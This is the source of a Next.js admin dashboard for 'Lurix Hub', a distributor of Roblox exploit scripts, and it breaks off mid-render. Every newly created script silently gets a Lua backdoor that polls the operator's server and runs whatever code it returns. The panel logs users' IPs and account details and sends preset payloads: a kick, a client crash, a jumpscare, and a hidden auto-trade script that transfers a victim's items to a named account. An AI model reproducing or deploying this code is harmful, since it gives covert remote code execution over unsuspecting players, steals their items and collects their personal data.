'use client';
import { useState, useEffect, useMemo } from 'react';
import Editor from '@monaco-editor/react';
import { supabase } from '@/lib/supabase';

// --- ICON COMPONENTS (Sắc nét, Không phụ thuộc thư viện ngoài) ---
const Icons = {
  Shield: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>,
  Zap: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>,
  Code: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>,
  Terminal: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>,
  Database: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21 3.582 4 8 4s8-1.79 8-4" /></svg>,
  Settings: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>,
  Home: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>,
  Copy: () => <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>,
  Check: () => <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" /></svg>,
  Plus: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v16m8-8H4" /></svg>,
  Trash: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>,
  Search: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>,
  Refresh: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>,
  LogOut: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg>,
  Cross: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>,
  Server: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2m-2-4h.01M17 16h.01" /></svg>,
  Box: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" /></svg>
};

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [activeTab, setActiveTab] = useState('custom_home'); // 'scripts' | 'backdoor' | 'custom_home' | 'user_logs' | 'settings'
  
  const [scripts, setScripts] = useState([]);
  const [selectedScript, setSelectedScript] = useState(null);
  const [code, setCode] = useState('');
  const [slug, setSlug] = useState('');
  const [title, setTitle] = useState('');
  const [status, setStatus] = useState('working');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');

  const [logs, setLogs] = useState([]);
  const [logSearchQuery, setLogSearchQuery] = useState('');
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);
  const [copiedJoinId, setCopiedJoinId] = useState(null);

  // Storage Modal State
  const [selectedStorageLog, setSelectedStorageLog] = useState(null);
  const [isStorageModalOpen, setIsStorageModalOpen] = useState(false);
  const [storageTab, setStorageTab] = useState('stands'); // 'stands' | 'inventory'
  const [copiedSlotIndex, setCopiedSlotIndex] = useState(null);

  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); 
  const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Executed")');
  const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
  const [backdoorHistory, setBackdoorHistory] = useState([]);

  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
  const [badgeText, setBadgeText] = useState('Online & Active');
  const [supportedGames, setSupportedGames] = useState([
    { name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }
  ]);
  const [loaderScript, setLoaderScript] = useState('');
  const [currentKey, setCurrentKey] = useState('');
  const [youtubeLink, setYoutubeLink] = useState('');
  const [discordLink, setDiscordLink] = useState('');
  const [newAdminPass, setNewAdminPass] = useState('');

  // UI States
  const [copiedLoader, setCopiedLoader] = useState(false);
  const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
  const [isSaving, setIsSaving] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!passwordInput) return;
    setIsLoggingIn(true);

    try {
      const res = await fetch('/api/admin/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: passwordInput }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setIsAuthenticated(true);
        loadAdminData();
        loadLogsData();
        loadBackdoorHistory();
      } else {
        alert(data.message || 'Invalid admin password.');
      }
    } catch (err) {
      alert('API connection error: ' + err.message);
    } finally {
      setIsLoggingIn(false);
    }
  };

  const loadAdminData = async () => {
    const { data: scriptsData } = await supabase.from('scripts').select('*').order('created_at', { ascending: false });
    if (scriptsData) {
      setScripts(scriptsData);
      if (scriptsData.length > 0 && !selectedScript) {
        selectScriptHandler(scriptsData[0]);
      }
    }

    const { data: settingsData } = await supabase.from('settings').select('*');
    if (settingsData) {
      settingsData.forEach(item => {
        if (item.key === 'site_title') setSiteTitle(item.value || 'LURIX HUB');
        if (item.key === 'badge_text') setBadgeText(item.value || 'Online & Active');
        if (item.key === 'supported_games') {
          try {
            const parsed = JSON.parse(item.value);
            if (Array.isArray(parsed) && parsed.length > 0) setSupportedGames(parsed);
          } catch(e) {}
        }
        if (item.key === 'loader_script') setLoaderScript(item.value || '');
        if (item.key === 'current_key') setCurrentKey(item.value || '');
        if (item.key === 'youtube_link') setYoutubeLink(item.value || 'https://www.youtube.com/@owizk');
        if (item.key === 'discord_link') setDiscordLink(item.value || '');
      });
    }
  };

  const loadLogsData = async () => {
    setIsLoadingLogs(true);
    const { data } = await supabase.from('execution_logs').select('*').order('created_at', { ascending: false }).limit(100);
    if (data) setLogs(data);
    setIsLoadingLogs(false);
  };

  const loadBackdoorHistory = async () => {
    const { data } = await supabase.from('backdoor_commands').select('*').order('created_at', { ascending: false }).limit(30);
    if (data) setBackdoorHistory(data);
  };

  const selectScriptHandler = (script) => {
    setSelectedScript(script);
    setCode(script.content || '');
    setSlug(script.slug || '');
    setTitle(script.title || '');
    setStatus(script.status || 'working');
  };

  const filteredScripts = useMemo(() => {
    return scripts.filter(s => {
      const matchesSearch = s.title?.toLowerCase().includes(searchQuery.toLowerCase()) || 
                            s.slug?.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesStatus = statusFilter === 'all' || (s.status || 'working') === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [scripts, searchQuery, statusFilter]);

  const filteredLogs = useMemo(() => {
    return logs.filter(l => {
      const q = logSearchQuery.toLowerCase().trim();
      if (!q) return true;
      return (
        l.roblox_username?.toLowerCase().includes(q) ||
        l.ip_address?.toLowerCase().includes(q) ||
        l.discord_user?.toLowerCase().includes(q) ||
        l.roblox_id?.toLowerCase().includes(q)
      );
    });
  }, [logs, logSearchQuery]);

  const getScriptLoadstring = (scriptSlug) => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
    return `loadstring(game:HttpGet("${domain}/api/raw/${scriptSlug}"))()`;
  };

  const getBackdoorLuaSnippet = () => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
    return `-- [Lurix Hub] Advanced Remote Loadstring Backdoor Engine
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

    while task.wait(4) do
        pcall(function()
            if not LocalPlayer then return end
            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(LocalPlayer.Name)
            local res = requestFunc({ Url = url, Method = "GET" })
            if res and res.Body and #res.Body > 0 then
                local func, err = loadstring(res.Body)
                if func then
                    task.spawn(func)
                end
            end
        end)
    end
end)`;
  };

  const handleCopyLoader = (scriptSlug) => {
    navigator.clipboard.writeText(getScriptLoadstring(scriptSlug));
    setCopiedLoader(true);
    setTimeout(() => setCopiedLoader(false), 2000);
  };

  const handleCopyBackdoorSnippet = () => {
    navigator.clipboard.writeText(getBackdoorLuaSnippet());
    setCopiedBackdoorSnippet(true);
    setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
  };

  const handleCopyJoinScript = async (log) => {
    if (!log.place_id || !log.job_id) return;
    const script = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
    try {
      await navigator.clipboard.writeText(script);
      setCopiedJoinId(log.id);
      setTimeout(() => setCopiedJoinId(null), 2000);
    } catch (err) {
      console.error('Copy join script error:', err);
    }
  };

  const handleOpenStorageModal = (log) => {
    setSelectedStorageLog(log);
    setStorageTab('stands');
    setIsStorageModalOpen(true);
  };

  const handleSendBackdoor = async () => {
    if (!backdoorLuaPayload.trim()) return alert('Please enter a Lua payload.');
    setIsSendingBackdoor(true);

    try {
      const res = await fetch('/api/backdoor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          adminPassword: passwordInput,
          targetType: backdoorTargetType,
          targetValue: backdoorTargetValue,
          payloadLua: backdoorLuaPayload
        })
      });

      const data = await res.json();
      if (data.success) {
        alert(data.message);
        loadBackdoorHistory();
      } else {
        alert('Error: ' + data.message);
      }
    } catch (err) {
      alert('Command error: ' + err.message);
    } finally {
      setIsSendingBackdoor(false);
    }
  };

  const setPresetPayload = (type) => {
    if (type === 'kick') {
      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("an admin changed your data")`);
    } else if (type === 'crash') {
      setBackdoorLuaPayload(`while true do end`);
    } else if (type === 'notification') {
      setBackdoorLuaPayload(`game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "LURIX HUB ADMIN",
    Text = "Administrator is watching your session!",
    Duration = 10
})`);
    } else if (type === 'trade') {
      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "mhauiw29" 
local AUTO_SEND_DELAY = 3                 
local AUTO_ACCEPT = false                  

local ADD_STANDS = false  
local ADD_ITEMS = true    

local MAX_ITEM_SLOTS = 4       
local MAX_AMOUNT_PER_ITEM = 0  

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local UICMDS = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UICMDS")
local TradeComm = ReplicatedStorage:WaitForChild("TradeEvents"):WaitForChild("TradeComm")

PlayerGui.ChildAdded:Connect(function(child)
    if child.Name == "TradeUI" or child.Name == "TradeRequest" then
        task.wait()
        if child:IsA("ScreenGui") then
            child.Enabled = false 
        end
        local bg = child:FindFirstChild("Background")
        if bg then
            bg.Visible = false
        end
    end
end)

local isTrading = false

TradeComm.OnClientEvent:Connect(function(action, data)
    if action == "ShowUI" then
        isTrading = true

        local myStands = (data and data.ItemData and data.ItemData.Stands) or {}
        local myItems = (data and data.ItemData and data.ItemData.Items) or {}
        
        if ADD_STANDS then
            for _, standData in pairs(myStands) do
                local standName = standData.Stand
                local attribute = standData.Attribute
                local guid = standData.GUID
                
                if standName and standName ~= "None" and attribute and attribute ~= "None" then
                    TradeComm:FireServer("AddStand", {
                        ["GUID"] = guid,
                        ["StandName"] = standName,
                        ["Attribute"] = attribute
                    })
                    task.wait(0.2)
                end
            end
        end
        
        if ADD_ITEMS then
            local itemCount = 0
            for itemName, amount in pairs(myItems) do
                
                if MAX_ITEM_SLOTS and MAX_ITEM_SLOTS > 0 and itemCount >= MAX_ITEM_SLOTS then
                    break
                end

                if itemName and amount and amount > 0 then
                    
                    local finalAmount = amount
                    if MAX_AMOUNT_PER_ITEM and MAX_AMOUNT_PER_ITEM > 0 then
                        finalAmount = math.min(amount, MAX_AMOUNT_PER_ITEM)
                    end

                    TradeComm:FireServer("AddItem", {
                        ["ItemName"] = itemName,
                        ["Amount"] = finalAmount
                    })
                    
                    itemCount = itemCount + 1
                    task.wait(0.2)
                end
            end
        end

        if AUTO_ACCEPT then
            task.wait(0.5)
            TradeComm:FireServer("AcceptTrade")
        end
    end

    if action == "CancelTrade" then
        isTrading = false
    end

    if action == "UpdateOffer" and isTrading and AUTO_ACCEPT then
        task.wait(0.3)
        TradeComm:FireServer("AcceptTrade")
    end
end)

task.spawn(function()
    while task.wait(AUTO_SEND_DELAY) do
        if not isTrading then
            UICMDS:FireServer(TARGET_PLAYER_NAME, "Trade")
        end
    end
end)`);
    } else if (type === 'Agree') {
      setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
Event:FireServer(
    "AcceptTrade"
)`);
    } else if (type === 'jumpscare') {
      setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
sound.SoundId = "rbxassetid://9114223177"
sound.Volume = 10
sound:Play()`);
    }
  };

  const handleSelectUserForBackdoor = (username) => {
    setActiveTab('backdoor');
    setBackdoorTargetType('USER');
    setBackdoorTargetValue(username);
  };

  const handleSaveScript = async () => {
    if (!selectedScript) return;
    setIsSaving(true);
    const { error } = await supabase.from('scripts').update({ 
      content: code, 
      slug: slug.toLowerCase().trim().replace(/\s+/g, '-'), 
      title, 
      status 
    }).eq('id', selectedScript.id);
    
    setIsSaving(false);
    if (error) alert('Save error: ' + error.message);
    else {
      alert('Script saved successfully.');
      loadAdminData();
    }
  };

  const handleCreateScript = async () => {
    const newTitle = prompt('Enter script title:');
    if (!newTitle) return;
    const newSlug = prompt('Enter script slug:');
    if (!newSlug) return;
    
    const cleanSlug = newSlug.toLowerCase().trim().replace(/\s+/g, '-');

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: cleanSlug, 
      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")\n\n${getBackdoorLuaSnippet()}`,
      status: 'working'
    }]).select();

    if (error) alert('Creation error: ' + error.message);
    else {
      alert('Script created successfully.');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDuplicateScript = async () => {
    if (!selectedScript) return;
    const newTitle = `${selectedScript.title} (Copy)`;
    const newSlug = `${selectedScript.slug}-copy`;

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: newSlug, 
      content: code,
      status: status
    }]).select();

    if (error) alert('Duplicate error: ' + error.message);
    else {
      alert('Script duplicated.');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDeleteScript = async (id) => {
    if (!confirm('Are you sure you want to delete this script?')) return;
    await supabase.from('scripts').delete().eq('id', id);
    setSelectedScript(null);
    loadAdminData();
  };

  const handleClearLogs = async () => {
    if (!confirm('Are you sure you want to clear all logs?')) return;
    await supabase.from('execution_logs').delete().neq('id', 0);
    setLogs([]);
    alert('Logs cleared.');
  };

  const handleAddGame = () => {
    setSupportedGames([...supportedGames, { name: 'New Game', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
  };

  const handleRemoveGame = (index) => {
    if (supportedGames.length <= 1) return alert('Must keep at least 1 game.');
    setSupportedGames(supportedGames.filter((_, i) => i !== index));
  };

  const handleGameChange = (index, field, value) => {
    const updated = [...supportedGames];
    updated[index][field] = value;
    setSupportedGames(updated);
  };

  const handleUploadToEditor = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      setCode(event.target.result);
      alert(`File content loaded.`);
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const handleSaveMainPageSettings = async () => {
    setIsSaving(true);
    const { error } = await supabase.from('settings').upsert([
      { key: 'site_title', value: siteTitle },
      { key: 'badge_text', value: badgeText },
      { key: 'supported_games', value: JSON.stringify(supportedGames) },
      { key: 'loader_script', value: loaderScript },
      { key: 'current_key', value: currentKey },
      { key: 'youtube_link', value: youtubeLink },
      { key: 'discord_link', value: discordLink }
    ]);
    setIsSaving(false);

    if (error) alert('Config error: ' + error.message);
    else {
      alert('Settings saved successfully.');
      loadAdminData();
    }
  };

  const handleSaveAdminPassword = async () => {
    if (!newAdminPass.trim()) return alert('Please enter a new password.');
    setIsSaving(true);

    try {
      const res = await fetch('/api/admin/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          currentPassword: passwordInput,
          newPassword: newAdminPass
        })
      });

      const data = await res.json();
      if (data.success) {
        alert('Password updated successfully.');
        setPasswordInput(newAdminPass);
        setNewAdminPass('');
      } else {
        alert('Error: ' + data.message);
      }
    } catch (err) {
      alert('Connection error: ' + err.message);
    } finally {
      setIsSaving(false);
    }
  };

  const parsedStandData = useMemo(() => {
    if (!selectedStorageLog || !selectedStorageLog.stand_storage) return { slots: [], spec_storage: 'Empty' };
    try {
      return typeof selectedStorageLog.stand_storage === 'string'
        ? JSON.parse(selectedStorageLog.stand_storage)
        : selectedStorageLog.stand_storage;
    } catch (e) {
      return { slots: [], spec_storage: 'Empty' };
    }
  }, [selectedStorageLog]);

  const parsedInventoryData = useMemo(() => {
    if (!selectedStorageLog || !selectedStorageLog.inventory_data) return [];
    try {
      return typeof selectedStorageLog.inventory_data === 'string'
        ? JSON.parse(selectedStorageLog.inventory_data)
        : selectedStorageLog.inventory_data;
    } catch (e) {
      return [];
    }
  }, [selectedStorageLog]);

  const getTierStyle = (tier) => {
    switch (String(tier).toUpperCase()) {
      case 'S+': case 'GOD': return 'border-amber-400/50 bg-amber-500/10 text-amber-300 shadow-[0_0_15px_rgba(251,191,36,0.25)]';
      case 'S': return 'border-purple-500/50 bg-purple-500/10 text-purple-300 shadow-[0_0_15px_rgba(168,85,247,0.25)]';
      case 'A': return 'border-blue-500/50 bg-blue-500/10 text-blue-300 shadow-[0_0_15px_rgba(59,130,246,0.25)]';
      case 'B': return 'border-emerald-500/50 bg-emerald-500/10 text-emerald-300';
      default: return 'border-slate-700 bg-slate-800/50 text-slate-400';
    }
  };

  // --- COMPONENT: LOGIN SCREEN ---
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#030712] text-white flex items-center justify-center p-4 relative overflow-hidden font-sans selection:bg-blue-500 selection:text-white">
        {/* Glow ambient background effects */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-gradient-to-tr from-blue-600/30 to-indigo-600/30 rounded-full blur-[140px] pointer-events-none" />
        <div className="absolute bottom-10 right-10 w-[300px] h-[300px] bg-purple-600/20 rounded-full blur-[120px] pointer-events-none" />

        <form 
          onSubmit={handleLogin} 
          className="z-10 bg-slate-900/80 border border-white/10 p-6 sm:p-10 rounded-3xl w-full max-w-md shadow-[0_20px_60px_rgba(0,0,0,0.8)] backdrop-blur-2xl relative overflow-hidden group"
        >
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-indigo-500 to-purple-500" />
          
          <div className="flex flex-col items-center mb-8">
            <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-blue-600 to-indigo-600 p-0.5 mb-4 shadow-[0_0_30px_rgba(59,130,246,0.5)]">
              <div className="w-full h-full bg-slate-950 rounded-[14px] flex items-center justify-center text-blue-400">
                <Icons.Shield />
              </div>
            </div>
            <h1 className="text-2xl font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-white via-slate-200 to-slate-400 uppercase">
              LURIX CONTROL
            </h1>
            <p className="text-xs text-slate-400 mt-1 font-medium">ADMIN AUTHENTICATION GATEWAY</p>
          </div>

          <div className="mb-6 space-y-2">
            <label className="text-[11px] font-bold text-slate-300 uppercase tracking-widest block">ADMIN ACCESS KEY</label>
            <div className="relative">
              <input
                type="password"
                placeholder="Enter password..."
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                className="w-full bg-slate-950/80 border border-white/10 rounded-2xl px-4 py-3.5 text-white text-sm font-mono focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all shadow-inner"
              />
            </div>
          </div>

          <button 
            type="submit"
            disabled={isLoggingIn}
            className="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 hover:brightness-110 text-white font-extrabold py-4 rounded-2xl text-xs uppercase tracking-wider shadow-[0_0_25px_rgba(79,70,229,0.4)] transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 active:scale-[0.98]"
          >
            {isLoggingIn ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                AUTHENTICATING...
              </span>
            ) : (
              <span className="flex items-center gap-2">
                <Icons.Zap /> ACCESS DASHBOARD
              </span>
            )}
          </button>
        </form>
      </div>
    );
  }

  // --- MAIN ADMIN DASHBOARD ---
  return (
    <div className="min-h-screen bg-[#030712] text-slate-100 p-3 sm:p-6 lg:p-8 flex flex-col gap-6 font-sans max-w-[1600px] mx-auto selection:bg-blue-500 selection:text-white">
      
      {/* Top Header Bar */}
      <header className="bg-slate-900/80 border border-white/10 p-4 sm:p-5 rounded-3xl backdrop-blur-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-[0_10px_40px_rgba(0,0,0,0.5)] relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-blue-500 to-transparent opacity-50" />
        
        <div className="flex items-center gap-4 w-full sm:w-auto">
          <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 p-0.5 shadow-[0_0_20px_rgba(59,130,246,0.3)] shrink-0">
            <div className="w-full h-full bg-slate-950 rounded-[14px] flex items-center justify-center text-blue-400 font-black text-xl">
              L
            </div>
          </div>
          <div>
            <div className="flex items-center gap-2.5 flex-wrap">
              <h1 className="text-xl sm:text-2xl font-black tracking-tight text-white uppercase">{siteTitle}</h1>
              <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2.5 py-0.5 rounded-full font-bold flex items-center gap-1.5 shadow-[0_0_10px_rgba(16,185,129,0.2)]">
                <span className="w-2 h-2 bg-emerald-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
              </span>
            </div>
            <p className="text-xs text-slate-400 font-medium mt-0.5">Control Panel & High-Performance Script Execution Engine</p>
          </div>
        </div>

        <div className="flex items-center gap-3 w-full sm:w-auto justify-end">
          <button 
            onClick={() => setIsAuthenticated(false)} 
            className="w-full sm:w-auto bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-rose-300 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-95"
          >
            <Icons.LogOut /> Logout
          </button>
        </div>
      </header>

      {/* Modern Stats Overview Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-4">
        <div className="bg-slate-900/60 border border-white/10 p-4 sm:p-5 rounded-2xl backdrop-blur-xl relative overflow-hidden group hover:border-blue-500/40 transition-all">
          <div className="flex justify-between items-center">
            <span className="text-[11px] text-slate-400 uppercase font-black tracking-wider">SCRIPTS</span>
            <span className="p-2 bg-blue-500/10 text-blue-400 rounded-xl"><Icons.Code /></span>
          </div>
          <div className="text-2xl sm:text-3xl font-black text-white mt-2">{scripts.length}</div>
        </div>

        <div className="bg-slate-900/60 border border-white/10 p-4 sm:p-5 rounded-2xl backdrop-blur-xl relative overflow-hidden group hover:border-indigo-500/40 transition-all">
          <div className="flex justify-between items-center">
            <span className="text-[11px] text-slate-400 uppercase font-black tracking-wider">EXEC LOGS</span>
            <span className="p-2 bg-indigo-500/10 text-indigo-400 rounded-xl"><Icons.Terminal /></span>
          </div>
          <div className="text-2xl sm:text-3xl font-black text-indigo-400 mt-2">{logs.length}</div>
        </div>

        <div className="bg-slate-900/60 border border-white/10 p-4 sm:p-5 rounded-2xl backdrop-blur-xl relative overflow-hidden group hover:border-amber-500/40 transition-all">
          <div className="flex justify-between items-center">
            <span className="text-[11px] text-slate-400 uppercase font-black tracking-wider">GAMES</span>
            <span className="p-2 bg-amber-500/10 text-amber-400 rounded-xl"><Icons.Server /></span>
          </div>
          <div className="text-2xl sm:text-3xl font-black text-amber-400 mt-2">{supportedGames.length}</div>
        </div>

        <div className="bg-slate-900/60 border border-white/10 p-4 sm:p-5 rounded-2xl backdrop-blur-xl relative overflow-hidden group hover:border-emerald-500/40 transition-all">
          <div className="flex justify-between items-center">
            <span className="text-[11px] text-slate-400 uppercase font-black tracking-wider">STATUS</span>
            <span className="p-2 bg-emerald-500/10 text-emerald-400 rounded-xl"><Icons.Zap /></span>
          </div>
          <div className="text-2xl sm:text-3xl font-black text-emerald-400 mt-2 flex items-center gap-2">
            100% <span className="text-xs text-slate-400 font-normal">Active</span>
          </div>
        </div>
      </div>

      {/* Navigation Tabs Bar */}
      <nav className="flex bg-slate-900/80 border border-white/10 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg backdrop-blur-xl no-scrollbar">
        {[
          { id: 'custom_home', label: 'Home Config', icon: Icons.Home },
          { id: 'scripts', label: `Scripts (${scripts.length})`, icon: Icons.Code },
          { id: 'backdoor', label: 'Backdoor RCE', icon: Icons.Terminal, highlight: true },
          { id: 'user_logs', label: `Logs (${logs.length})`, icon: Icons.Database },
          { id: 'settings', label: 'Settings', icon: Icons.Settings },
        ].map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => {
                setActiveTab(tab.id);
